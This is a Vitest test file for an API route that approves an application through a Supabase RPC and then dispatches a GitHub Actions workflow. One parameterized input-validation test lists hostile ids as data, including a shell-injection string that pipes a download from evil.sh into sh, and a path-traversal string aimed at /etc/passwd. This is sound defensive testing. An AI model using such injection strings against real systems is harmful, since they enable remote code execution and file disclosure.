import { describe, it, expect, vi, beforeEach } from "vitest";
import { POST } from "./route";

const mockRpc = vi.fn();
vi.mock("@supabase/supabase-js", () => ({
  createClient: vi.fn(() => ({ rpc: mockRpc })),
}));

beforeEach(() => {
  vi.stubEnv("GITHUB_DISPATCH_TOKEN", "test-token");
  vi.stubGlobal("fetch", vi.fn(() => Promise.resolve({ ok: true, status: 204 } as Response)));
  mockRpc.mockReset();
  // Both approve_application and reset_approval resolve successfully by default; individual
  // tests override with mockImplementationOnce / mockResolvedValueOnce as needed. Keeping this
  // as a single shared mock (rather than one per RPC name) matches how the real supabase-js
  // client exposes one .rpc() method for every function.
  mockRpc.mockImplementation((fn: string) => {
    if (fn === "approve_application") return Promise.resolve({ data: null, error: null });
    if (fn === "reset_approval") return Promise.resolve({ data: null, error: null });
    return Promise.resolve({ data: null, error: null });
  });
});

function makeRequest(idInPath = "5") {
  return new Request(`http://localhost/api/applications/${idInPath}/submit`, { method: "POST" });
}

describe("POST /api/applications/[id]/submit", () => {
  it("calls the approve_application RPC before dispatching", async () => {
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(200);
    expect(mockRpc).toHaveBeenCalledWith("approve_application", { p_id: 5 });
    expect(global.fetch).toHaveBeenCalled();
    // C3: a successful dispatch must never touch the recovery path.
    expect(mockRpc).not.toHaveBeenCalledWith("reset_approval", expect.anything());
  });

  it("dispatches the apply_agent_submit workflow with the application id", async () => {
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(200);
    const [url, options] = (global.fetch as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(url).toContain("apply_agent_submit.yml/dispatches");
    const body = JSON.parse((options as RequestInit).body as string);
    expect(body.inputs.application_id).toBe("5");
  });

  it("returns 409 and does not dispatch when the RPC rejects the row", async () => {
    mockRpc.mockResolvedValue({
      data: null,
      error: { message: "approve_application: row 5 is not in an approvable state" },
    });
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(409);
    const body = await res.json();
    expect(body.error).toContain("not in an approvable state");
    expect(global.fetch).not.toHaveBeenCalled();
  });

  it("returns 502 and calls reset_approval when GitHub dispatch fails (C3 -- a failed dispatch must not permanently brick the row)", async () => {
    vi.stubGlobal("fetch", vi.fn(() => Promise.resolve({ ok: false, status: 500 } as Response)));
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(502);
    expect(mockRpc).toHaveBeenCalledWith("approve_application", { p_id: 5 });
    expect(mockRpc).toHaveBeenCalledWith("reset_approval", { p_id: 5 });
  });

  it("returns 502 and calls reset_approval when the fetch call itself throws (network-level failure, not just a non-ok response)", async () => {
    vi.stubGlobal("fetch", vi.fn(() => Promise.reject(new Error("network down"))));
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(502);
    expect(mockRpc).toHaveBeenCalledWith("reset_approval", { p_id: 5 });
  });

  // This id lands in the environment of the one workflow that sets APPLY_AGENT_ARMED=1.
  // A non-numeric value has no legitimate use, so reject it before it ever gets dispatched
  // -- and before the RPC is even called.
  it.each([
    ['1"; curl evil.sh | sh; "', "shell metacharacters"],
    ["../../etc/passwd", "path traversal"],
    ["", "empty"],
    ["5abc", "trailing garbage"],
  ])("rejects a non-numeric id (%s) without dispatching or calling the RPC", async (badId) => {
    const res = await POST(makeRequest(badId), { params: Promise.resolve({ id: badId }) });
    expect(res.status).toBe(400);
    expect(global.fetch).not.toHaveBeenCalled();
    expect(mockRpc).not.toHaveBeenCalled();
  });

  it("returns 500 when GITHUB_DISPATCH_TOKEN is missing, without dispatching or calling the RPC", async () => {
    vi.stubEnv("GITHUB_DISPATCH_TOKEN", "");
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(500);
    expect(global.fetch).not.toHaveBeenCalled();
    expect(mockRpc).not.toHaveBeenCalled();
  });
});
